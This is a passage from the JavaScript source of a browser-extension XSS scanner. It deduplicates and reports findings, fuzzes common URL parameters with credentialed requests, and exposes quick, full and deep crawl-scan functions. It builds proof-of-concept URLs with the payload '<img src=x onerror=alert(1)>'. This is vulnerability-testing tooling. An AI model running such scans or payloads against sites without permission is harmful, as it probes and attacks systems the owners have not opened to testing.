      [CONTEXTS.JS_STRING_DOUBLE]: `Reflects in JS double-quoted string. Unescaped: ${unesc}`,
      [CONTEXTS.JS_STRING_SINGLE]: `Reflects in JS single-quoted string. Unescaped: ${unesc}`,
      [CONTEXTS.JS_TEMPLATE]: `Reflects in JS template literal. Unescaped: ${unesc}`,
      [CONTEXTS.JS_CODE]: `Direct injection into JavaScript code - critically exploitable`,
      [CONTEXTS.EVENT_HANDLER]: `Reflects in event handler - direct code execution`,
      [CONTEXTS.JAVASCRIPT_URL]: `Reflects in javascript: URL - direct code execution`,
    };

    return explanations[context] || `Vulnerable ${contextName} context. Unescaped chars: ${unesc}`;
  }

  // Track reported findings to avoid duplicates
  const reportedFindings = new Set();

  /**
   * Generate a unique key for a finding to detect duplicates.
   * Normalizes URLs by removing variable parts like IDs.
   */
  function getFindingKey(finding) {
    // Normalize URL: replace numeric IDs with placeholder
    let normalizedUrl = (finding.url || '').replace(/[?&](\w+)=\d+/g, '?$1=<ID>');
    normalizedUrl = normalizedUrl.replace(/\/\d+($|[?#])/g, '/<ID>$1');

    // Key components
    const type = finding.type || '';
    const subtype = finding.subtype || '';
    const param = finding.parameter || finding.source || '';
    const context = finding.context || '';
    const sink = finding.sink || '';

    // Extract path pattern (endpoint) without query params
    let pathPattern = '';
    try {
      const urlObj = new URL(normalizedUrl);
      pathPattern = urlObj.pathname;
    } catch {
      pathPattern = normalizedUrl.split('?')[0];
    }

    return `${type}|${subtype}|${pathPattern}|${param}|${context}|${sink}`;
  }

  function reportFinding(finding) {
    if (!_lkValid || !window.__lonkeroKey) return;
    // Check for duplicates
    const key = getFindingKey(finding);
    if (reportedFindings.has(key)) {
      console.log(`[XSS Scanner] Skipping duplicate: ${finding.type} on ${finding.parameter || finding.source}`);
      return;
    }
    reportedFindings.add(key);

    window.postMessage({
      type: '__lonkero_xss_finding__',
      finding: finding,
    }, '*');

    findings.push(finding);

    const severity = finding.severity?.toUpperCase() || 'UNKNOWN';
    console.log(`[XSS Scanner] ${severity}: ${finding.type}`, finding);
  }

  // ============================================
  // PUBLIC API
  // ============================================

  window.xssScanner = {
    // Full comprehensive scan (current page)
    scan: comprehensiveScan,

    // Deep scan - crawls site and tests ALL discovered endpoints
    deepScan: deepScan,

    // Crawl site without testing (returns discovered endpoints)
    crawl: crawlSite,

    // Quick scan (DOM XSS + existing params + quick discovery)
    quickScan: async function() {
      console.log('[XSS Scanner] Quick scan...');
      const results = [];

      // DOM XSS
      const domVulns = analyzeDOM_XSS();
      for (const v of domVulns) {
        // Build POC URL based on source type
        let pocUrl = location.href;
        if (v.source === 'location.hash') {
          pocUrl = location.origin + location.pathname + location.search + '#<img src=x onerror=alert(1)>';
        } else if (v.source === 'location.search') {
          const testUrl = new URL(location.href);
          testUrl.searchParams.set('xss', '<img src=x onerror=alert(1)>');
          pocUrl = testUrl.toString();
        }

        const finding = {
          ...v,
          type: 'DOM_XSS',
          severity: 'high',
          url: location.href,
          pocUrl: pocUrl,
          payload: '<img src=x onerror=alert(1)>',
        };
        results.push(finding);
        reportFinding(finding);
      }

      // Test existing params
      const params = new URL(location.href).searchParams;
      for (const [name, value] of params) {
        const vuln = await testParameterWithProof(location.href, name, value);
        if (vuln) {
          results.push(vuln);
          reportFinding(vuln);
        }
      }

      // Quick discovery - test top 20 most common params
      const quickParams = ['q', 'search', 'query', 'id', 'name', 'msg', 'message', 'url',
                          'redirect', 'return', 'next', 'callback', 'error', 'input',
                          'text', 'content', 'value', 'data', 'user', 'ref'];

      for (const param of quickParams) {
        if (params.has(param)) continue;

        const canary = 'QS' + Math.random().toString(36).substring(2, 6);
        const testUrl = new URL(location.href);
        testUrl.searchParams.set(param, canary);

        try {
          const resp = await fetch(testUrl.toString(), { credentials: 'include' });
          if (resp.ok) {
            const html = await resp.text();
            if (html.includes(canary)) {
              console.log(`[XSS Scanner] Quick: Found reflection in ${param}`);
              const vuln = await testParameterWithProof(testUrl.toString(), param, canary);
              if (vuln) {
                results.push(vuln);
                reportFinding(vuln);
              }
            }
          }
        } catch {
          // Ignore
        }
      }

      return results;
    },

    // Test single parameter
    testParameter: testParameterWithProof,

    // Differential fuzz single parameter
    diffFuzz: differentialFuzz,

    // DOM XSS analysis only
    analyzeDOM: analyzeDOM_XSS,

    // Get all findings
    getFindings: () => findings,

    // Clear findings
    clearFindings: () => { findings.length = 0; },

    // Analysis utilities (exposed for debugging)
    analyzeContext,
    analyzeEscaping,
    parseDomStructure,
  };

  // ============================================
  // AUTO-RUN & EVENT LISTENERS
  // ============================================

  // Listen for scan requests from content script
  window.addEventListener('message', (event) => {
    if (event.source !== window) return;

    if (event.data?.type === '__lonkero_run_xss_scan__') {
      comprehensiveScan();
    }
    if (event.data?.type === '__lonkero_run_xss_quick_scan__') {
      xssScanner.quickScan();
    }
    if (event.data?.type === '__lonkero_run_xss_deep_scan__') {
      const options = event.data.options || {};
      xssScanner.deepScan(options);
    }
  });

  // AUTO-SCAN DISABLED - triggers WAF bans
  // Scans are now triggered manually via popup buttons
  // To enable auto-scan, uncomment the block below
  /*
  setTimeout(() => {
    const runAutoScan = () => {
      console.log('[XSS Scanner] Auto-scanning page...');
      xssScanner.quickScan().then(results => {
        if (results.length > 0) {
          console.log(`[XSS Scanner] Auto-scan found ${results.length} potential vulnerabilities`);
        }
      }).catch(err => {
        console.error('[XSS Scanner] Auto-scan error:', err);
      });
    };

    if (document.readyState === 'complete') {
      runAutoScan();
    } else {
      window.addEventListener('load', runAutoScan);
    }
  }, 1500);
  */

  console.log('[Lonkero] XSS Scanner v2.5 loaded.');
  console.log('  xssScanner.quickScan()  - Fast scan (current page)');
  console.log('  xssScanner.scan()       - Full scan (current page + param discovery)');
  console.log('  xssScanner.deepScan()   - DEEP SCAN (crawl + API probe + test ALL)');
  console.log('  xssScanner.crawl()      - Crawl site (returns discovered endpoints)');
  console.log('  + JSONP, template injection (no FPs), API discovery, SPA support');
})();
